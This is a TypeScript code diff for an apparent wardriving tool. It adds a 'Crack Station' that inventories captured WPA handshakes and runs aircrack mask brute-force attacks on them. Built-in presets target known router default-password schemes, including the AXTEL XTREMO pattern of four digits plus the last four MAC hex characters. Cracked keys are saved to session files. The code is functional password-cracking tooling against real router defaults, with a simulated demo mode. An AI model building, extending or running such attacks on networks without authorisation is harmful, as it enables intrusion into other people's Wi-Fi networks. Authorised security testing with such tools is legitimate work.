@@ -17,10 +17,12 @@ import {
   WardriveTargetStatus,
   WardriveDeviceView,
   AttackStep,
+  HandshakeEntry,
 } from "./types";
 import { registerShutdownHook } from "../device/display";
 import { unloadModel } from "../cloud-api/local/ollama-llm";
-import { crackCheck, resolveCapPath, DictCrack, type CrackResult, type DictCrackState } from "./crack";
+import { crackCheck, resolveCapPath, DictCrack, MaskCrack, maskTotal, type CrackResult, type DictCrackState, type MaskRunState } from "./crack";
+import type { MaskPreset } from "./types";
 import { lookupVendorOrRandomAsync, macvendorsEnabled } from "../wifiradar/oui";
 import { demoTargetsWithPassword, DEMO_WD_TARGETS, type DemoWardriveTarget } from "./discovery";
 
@@ -140,6 +142,437 @@ export class WardriveService extends EventEmitter {
   // rockyou on the device (~/wordlists/rockyou.txt) — overridable for tests.
   private dictWordlist(): string {
     return process.env.WARDRIVE_WORDLIST || path.join(process.env.HOME || "/home/akbal", "wordlists", "rockyou.txt");
+  }
+
+  // ─── Crack Station (persistent sub-section) ────────────────────────────
+  // One persistent inventory of every captured handshake, live-session or
+  // past-session, with crack controls (dictionary / mask brute-force).
+  // Built-in mask presets ship for AXTEL XTREMO-style default passwords
+  // (@@@@ + last-4-MAC); operator-created ones persist in
+  // ~/wardrive-sessions/crack-station.json (never committed).
+  private static BUILTIN_MASKS: MaskPreset[] = [
+    {
+      id: "builtin-xtremo-digits-mac4",
+      name: "AXTEL XTREMO (4 dígitos + MAC)",
+      description:
+        "Default de módems AXTEL XTREMO: 4 dígitos aleatorios seguidos de los últimos 4 caracteres hex de la MAC del AP. "
+        + "Patrón @@@@<MAC4> — p.ej. para 72:02:71:78:6E:E9 → @@@@6EE8.",
+      pattern: "@@@@",
+      autoMacSuffix: true,
+    },
+    {
+      id: "builtin-numeric-8",
+      name: "Numérica 8 dígitos",
+      description: "8 dígitos decimales (00000000-99999999). Útil para PINs numéricos por defecto; ~100M claves, lento en la Pi.",
+      pattern: "@@@@@@@@",
+      autoMacSuffix: false,
+    },
+    {
+      id: "builtin-hex-8",
+      name: "Hex 8 (a-f0-9)",
+      description: "8 caracteres hexadecimales minúscula. Default común en routers con clave WPA de 8 hex.",
+      pattern: "####@@@@",
+      autoMacSuffix: false,
+    },
+    {
+      id: "builtin-lower-8",
+      name: "Minúsculas 8 (a-z)",
+      description: "8 letras minúsculas (aaaaaaaz-zzzzzzzz). Muy largo en CPU de la Pi — considerar antes rockyou.",
+      pattern: "########",
+      autoMacSuffix: false,
+    },
+  ];
+
+  private maskPresets: MaskPreset[] = [];
+  private maskPresetsLoaded = false;
+  private maskRuns = new Map<string, MaskRunState & { done: boolean }>();
+  private maskCrack: MaskCrack | null = null;
+  private maskCrackKey: string | null = null;
+
+  private masksFile(): string {
+    return path.join(SESSIONS_ROOT, "crack-station.json");
+  }
+
+  // Load operator-created mask recipes from the sessions root (once, but
+  // re-checked when the file changes size/mtime — cheap stat).
+  private loadMaskPresets(): void {
+    if (this.maskPresetsLoaded) {
+      // Reload if the file changed since last read (another client edit).
+      const stat = fs.existsSync(this.masksFile()) ? fs.statSync(this.masksFile()).mtimeMs : 0;
+      if (stat === (this as any)._masksMtime) return;
+    }
+    this.maskPresetsLoaded = true;
+    this.maskPresets = WardriveService.BUILTIN_MASKS.map((m) => ({ ...m }));
+    try {
+      const raw = JSON.parse(fs.readFileSync(this.masksFile(), "utf8"));
+      if (Array.isArray(raw.masks)) {
+        for (const m of raw.masks) {
+          if (!m || typeof m.pattern !== "string" || !m.pattern) continue;
+          this.maskPresets.push({
+            id: typeof m.id === "string" && m.id ? m.id : `m-${Date.now()}`,
+            name: String(m.name || "Sin nombre"),
+            description: String(m.description || ""),
+            pattern: m.pattern,
+            autoMacSuffix: m.autoMacSuffix === true,
+          });
+        }
+      }
+    } catch {
+      // first run / corrupt file: builtins only
+    }
+    (this as any)._masksMtime = fs.existsSync(this.masksFile()) ? fs.statSync(this.masksFile()).mtimeMs : 0;
+  }
+
+  private saveMaskPresets(): void {
+    try {
+      fs.writeFileSync(
+        this.masksFile(),
+        JSON.stringify({ masks: this.maskPresets.filter((m) => !m.id.startsWith("builtin-")) }, null, 2),
+      );
+      (this as any)._masksMtime = fs.statSync(this.masksFile()).mtimeMs;
+    } catch (err: any) {
+      console.warn("[wardrive] mask presets save failed:", err?.message || err);
+    }
+  }
+
+  listMaskPresets(): MaskPreset[] {
+    this.loadMaskPresets();
+    return this.maskPresets;
+  }
+
+  addMaskPreset(raw: { name?: unknown; description?: unknown; pattern?: unknown; autoMacSuffix?: unknown }): { ok: boolean; error?: string; preset?: MaskPreset } {
+    this.loadMaskPresets();
+    const name = String(raw.name || "").trim();
+    const pattern = String(raw.pattern || "").trim();
+    if (!name) return { ok: false, error: "Nombre requerido" };
+    if (!pattern || !/^[@#a-zA-Z0-9]*$/.test(pattern)) {
+      return { ok: false, error: "Patrón vacío o con caracteres fuera de @, # y literales" };
+    }
+    const suffix = raw.autoMacSuffix === true;
+    if (suffix && !pattern.endsWith("@@@@")) {
+      return { ok: false, error: 'Con sufijo MAC, el patrón debe terminar en @@@@ (se reemplaza por los últimos 4 hex de la MAC al lanzar)' };
+    }
+    const preset: MaskPreset = {
+      id: `m-${Date.now()}`,
+      name,
+      description: String(raw.description || "").trim(),
+      pattern,
+      autoMacSuffix: suffix,
+    };
+    this.maskPresets.push(preset);
+    this.saveMaskPresets();
+    return { ok: true, preset };
+  }
+
+  removeMaskPreset(id: string): { ok: boolean; error?: string } {
+    this.loadMaskPresets();
+    if (id.startsWith("builtin-")) return { ok: false, error: "Los presets de fábrica no se pueden borrar" };
+    const idx = this.maskPresets.findIndex((m) => m.id === id);
+    if (idx < 0) return { ok: false, error: "Máscara no encontrada" };
+    this.maskPresets.splice(idx, 1);
+    this.saveMaskPresets();
+    return { ok: true };
+  }
+
+  // Expand a preset into its final pattern against a target BSSID (the
+  // autoMacSuffix step — last 4 hex of the BSSID, like crunch -t @@@@6EE8).
+  private finalizeMaskPattern(pattern: string, autoMacSuffix: boolean, bssid: string): string {
+    if (!autoMacSuffix) return pattern;
+    const hex = bssid.replace(/:/g, "").toLowerCase();
+    return pattern + hex.slice(-4);
+  }
+
+  // Persistent inventory for Crack Station: every captured handshake the
+  // device knows about, live session first, then every past session folder.
+  handshakeInventory(): { items: HandshakeEntry[] } {
+    const items: HandshakeEntry[] = [];
+    const active = this.session;
+    if (active) {
+      for (const t of active.listTargets()) {
+        if (t.status !== "captured") continue;
+        items.push({
+          sessionId: active.id,
+          bssid: t.bssid,
+          ssid: t.ssid,
+          hasHandshake: true,
+          password: t.password || null,
+          verified: t.verified === true,
+          live: true,
+          capFile: (t.files || []).find((f) => /\.(cap|pcapng)$/i.test(f)) || null,
+        });
+      }
+    }
+    try {
+      const root = SESSIONS_ROOT;
+      for (const dir of fs.readdirSync(root, { withFileTypes: true })) {
+        if (!dir.isDirectory()) continue;
+        const id = dir.name;
+        // The live session is already listed above — never double-report it.
+        if (active && id === active.id) continue;
+        let targets: any[] = [];
+        try {
+          targets = (JSON.parse(fs.readFileSync(path.join(root, id, "session.json"), "utf8")).targets || []) as any[];
+        } catch {
+          // no/corrupt meta — skip the folder (it may lack session.json)
+          continue;
+        }
+        for (const t of targets) {
+          if (t.status !== "captured") continue;
+          items.push({
+            sessionId: id,
+            bssid: t.bssid,
+            ssid: t.ssid || "",
+            hasHandshake: true,
+            password: typeof t.password === "string" ? t.password : null,
+            verified: t.verified === true,
+            live: false,
+            capFile: (t.files || []).find((f: string) => /\.(cap|pcapng)$/i.test(f)) || null,
+          });
+        }
+      }
+    } catch {
+      // no sessions root yet
+    }
+    return { items };
+  }
+
+  // ─── Mask brute-force run (Crack Station) ──────────────────────────────
+  // One aircrack at a time across dictionary AND mask runs — same CPU.
+  // `presetId` selects a stored recipe; `pattern` overrides it directly.
+  // autoMacSuffix appends the target's last-4 MAC hex at launch (AXTEL
+  // XTREMO-style: @@@@ → @@@@6EE8).
+  maskRunStatus(): { key: string | null; state: (MaskRunState & { done: boolean }) | null; presets: MaskPreset[] } {
+    this.loadMaskPresets();
+    if (!this.maskRuns.size) return { key: null, state: null, presets: this.maskPresets };
+    const [key, state] = [...this.maskRuns.entries()][0];
+    return { key, state, presets: this.maskPresets };
+  }
+
+  async startMaskRun(
+    bssidRaw: string,
+    opts: { presetId?: string; pattern?: string; autoMacSuffix?: unknown; cap?: string },
+  ): Promise<{ ok: boolean; error?: string; key?: string }> {
+    const bssid = WardriveService.clean(bssidRaw);
+    if (!bssid) return { ok: false, error: "BSSID inválido" };
+    if (this.dictCrack?.getState().running) {
+      return { ok: false, error: `Ya hay un crack de diccionario en curso (${this.dictCrackBssid}) — cancelalo primero` };
+    }
+    const running = [...this.maskRuns.values()].find((s) => s.running);
+    if (running) return { ok: false, error: "Ya hay un ataque de máscara en curso — cancelalo primero" };
+    this.loadMaskPresets();
+    let pattern = "";
+    let autoSuffix = false;
+    if (opts.presetId) {
+      const preset = this.maskPresets.find((m) => m.id === opts.presetId);
+      if (!preset) return { ok: false, error: "Máscara no encontrada" };
+      pattern = preset.pattern;
+      autoSuffix = preset.autoMacSuffix;
+    } else if (opts.pattern) {
+      pattern = String(opts.pattern).trim();
+      if (!/^[@#$a-zA-Z0-9]*$/.test(pattern)) {
+        return { ok: false, error: "Patrón con caracteres fuera de @, #, $ y literales" };
+      }
+      autoSuffix = opts.autoMacSuffix === true;
+      if (autoSuffix && !pattern.endsWith("@@@@")) {
+        return { ok: false, error: "Con sufijo MAC el patrón debe terminar en @@@@" };
+      }
+    } else {
+      return { ok: false, error: "Falta la máscara (pattern o presetId)" };
+    }
+    const finalPattern = this.finalizeMaskPattern(pattern, autoSuffix, bssid);
+    const total = maskTotal(finalPattern);
+    if (total > 2_000_000_000) {
+      return { ok: false, error: `Máscara demasiado ancha (${total} claves) — acotála` };
+    }
+
+    // Resolve the .cap: explicit `cap` path (past session), the live
+    // session's capture, or Crack Station's inventory.
+    let capPath: string | null = null;
+    let ownerDir: string | null = null;
+    if (opts.cap) {
+      capPath = this.resolveSessionPath(opts.cap);
+      if (!capPath || !/\.(cap|pcapng)$/i.test(capPath) || !fs.existsSync(capPath)) {
+        return { ok: false, error: "Archivo .cap inválido o fuera de las sesiones" };
+      }
+      ownerDir = path.dirname(capPath);
+    } else if (this.targetMeta.get(bssid)?.status === "captured" && this.session) {
+      capPath = resolveCapPath(this.session.dir, this.targetFiles(bssid));
+      if (!capPath) return { ok: false, error: "El objetivo no tiene archivo .cap" };
+    } else {
+      const entry = this.handshakeInventory().items.find((i) => i.bssid === bssid);
+      if (!entry?.capFile) return { ok: false, error: "No hay captura para ese objetivo" };
+      capPath = this.resolveSessionPath(`${entry.sessionId}/${entry.capFile}`);
+      if (!capPath) return { ok: false, error: "Archivo .cap inválido" };
+      ownerDir = path.dirname(capPath);
+    }
+
+    const key = `${bssid}|${finalPattern}`;
+    const demo = this.source === "demo" || /(^|\/|\\)demo-/.test(ownerDir || "") || /(^|\/|\\)demo-/.test(capPath);
+    if (demo) {
+      return this.startMaskDemo(bssid, key, finalPattern, ownerDir || undefined);
+    }
+
+    this.maskCrack = new MaskCrack(capPath, bssid, finalPattern);
+    this.maskCrackKey = key;
+    const state = {
+      running: true,
+      done: false,
+      pattern: finalPattern,
+      bssid,
+      progress: { tried: 0, total, fps: 0, elapsedSec: 0 },
+      result: null as CrackResult | null,
+    };
+    this.maskRuns.set(key, state);
+    this.maskCrack.on("done", () => {
+      const st = this.maskCrack?.getState();
+      state.running = false;
+      state.done = true;
+      if (st) {
+        state.progress = st.progress;
+        state.result = st.result;
+        if (st.result?.matched) {
+          const m = /KEY FOUND!\s*\[\s*(.*?)\s*\]/.exec(st.result.output || "");
+          const password = m?.[1] || "";
+          if (password) {
+            this.verified.set(bssid, st.result);
+            this.foundPasswords.set(bssid, { password, ssid: this.maskSsidFor(bssid) });
+            if (ownerDir) {
+              this.persistPastSessionPassword(ownerDir, bssid, password);
+            } else {
+              this.session?.setFoundPassword(bssid, password);
+            }
+          }
+          this.appendLog(bssid, "[mask] KEY FOUND — handshake validado por máscara");
+        } else {
+          this.appendLog(bssid, `[mask] terminado: ${st.result?.verdict} (${st.progress.tried} claves)`);
+        }
+      }
+      this.maskCrack = null;
+      this.maskCrackKey = null;
+      this.broadcastStatus();
+    });
+    this.maskCrack.start();
+    this.appendLog(bssid, `[mask] aircrack con máscara ${finalPattern}`);
+    return { ok: true, key };
+  }
+
+  private maskSsidFor(bssid: string): string {
+    return (
+      this.targetMeta.get(bssid)?.ssid
+      || this.handshakeInventory().items.find((i) => i.bssid === bssid)?.ssid
+      || ""
+    );
+  }
+
+  stopMaskRun(): { ok: boolean } {
+    if (this.demoMask?.running) this.stopMaskDemo();
+    else this.maskCrack?.stop();
+    return { ok: true };
+  }
+
+  clearMaskRun(): { ok: boolean } {
+    if (this.demoMask?.running) return { ok: false };
+    if (this.maskCrack?.getState().running) return { ok: false };
+    for (const [key] of this.maskRuns) this.maskRuns.delete(key);
+    this.maskCrack = null;
+    this.maskCrackKey = null;
+    return { ok: true };
+  }
+
+  // Simulated mask run (demo source / demo sessions): paced progress like
+  // the dict demo; ends "exhausted" unless the pattern literally matches
+  // the demo password (then KEY FOUND partway through).
+  private demoMask: (MaskRunState & { done: boolean; timer: ReturnType<typeof setInterval> | null }) | null = null;
+
+  private startMaskDemo(bssid: string, key: string, pattern: string, ownerDir?: string): { ok: boolean; error?: string; key?: string } {
+    const demoTarget = DEMO_WD_TARGETS.find((t) => t.bssid === bssid);
+    const demoPassword = demoTarget?.demoPassword;
+    // Does the demo password fit the mask? (@ digit, # lower, $ hex)
+    const fits = (pw: string, pat: string): boolean =>
+      pw.length === pat.length &&
+      [...pat].every((c, i) => {
+        if (c === "@") return /[0-9]/.test(pw[i]);
+        if (c === "#") return /[a-z]/.test(pw[i]);
+        if (c === "$") return /[0-9a-f]/.test(pw[i]);
+        return c === pw[i];
+      });
+    const total = maskTotal(pattern);
+    const hitAt = demoPassword && fits(demoPassword, pattern)
+      ? Math.max(Math.floor(total * 0.4), 1)
+      : total + 1; // never
+    this.demoMask = {
+      running: true,
+      done: false,
+      pattern,
+      bssid,
+      progress: { tried: 0, total, fps: 0, elapsedSec: 0 },
+      result: null,
+      timer: null,
+    };
+    this.maskRuns.set(key, this.demoMask);
+    const startedAt = Date.now();
+    let tried = 0;
+    const perTick = Math.max(10_000, Math.floor(total / 40)); // finish in ~40 ticks
+    this.demoMask.timer = setInterval(() => {
+      const dm = this.demoMask;
+      if (!dm) return;
+      tried = Math.min(total, tried + perTick);
+      dm.progress = {
+        tried,
+        total,
+        fps: tried / Math.max(1, (Date.now() - startedAt) / 1000),
+        elapsedSec: Math.round((Date.now() - startedAt) / 1000),
+      };
+      if (demoPassword && tried >= Math.min(total, hitAt)) {
+        if (dm.timer) clearInterval(dm.timer);
+        dm.running = false;
+        dm.done = true;
+        dm.result = {
+          verdict: "verified",
+          matched: true,
+          eapolPackets: 2,
+          handshakeHint: true,
+          output: `KEY FOUND! [ ${demoPassword} ]`,
+        };
+        this.verified.set(bssid, dm.result);
+        this.foundPasswords.set(bssid, { password: demoPassword, ssid: demoTarget?.ssid || "" });
+        if (ownerDir) this.persistPastSessionPassword(ownerDir, bssid, demoPassword);
+        this.session?.setFoundPassword(bssid, demoPassword);
+        this.session?.updateTarget(bssid, { verified: true });
+        this.appendLog(bssid, "[mask] KEY FOUND (demo)");
+        this.broadcastStatus();
+      } else if (tried >= total) {
+        if (dm.timer) clearInterval(dm.timer);
+        dm.running = false;
+        dm.done = true;
+        dm.result = {
+          verdict: "handshake_wrong_password",
+          matched: false,
+          eapolPackets: 2,
+          handshakeHint: true,
+          output: "KEY NOT FOUND (demo — máscara agotada)",
+        };
+        this.appendLog(bssid, "[mask] agotada sin match (demo)");
+        this.broadcastStatus();
+      }
+    }, DEMO_DICT_TICK_MS);
+    void ownerDir;
+    return { ok: true, key };
+  }
+
+  private stopMaskDemo(): void {
+    if (this.demoMask?.timer) clearInterval(this.demoMask.timer);
+    if (this.demoMask) {
+      this.demoMask.running = false;
+      this.demoMask.done = true;
+      this.demoMask.result = {
+        verdict: "error",
+        matched: false,
+        eapolPackets: 0,
+        handshakeHint: false,
+        output: `cancelado tras ${this.demoMask.progress.tried} claves`,
+      };
+    }
   }
 
   // Start a dictionary crack against a captured target. One at a time;
@@ -1565,6 +1998,11 @@ export class WardriveService extends EventEmitter {
     this.dictCrack?.stop();
     this.dictCrack = null;
     this.dictCrackBssid = null;
+    // A mask run must not outlive the session either.
+    this.stopMaskDemo();
+    this.maskCrack?.stop();
+    this.maskCrack = null;
+    this.maskCrackKey = null;
     // Demo simulation state dies with the runners too.
     this.stopDictDemo();
   }
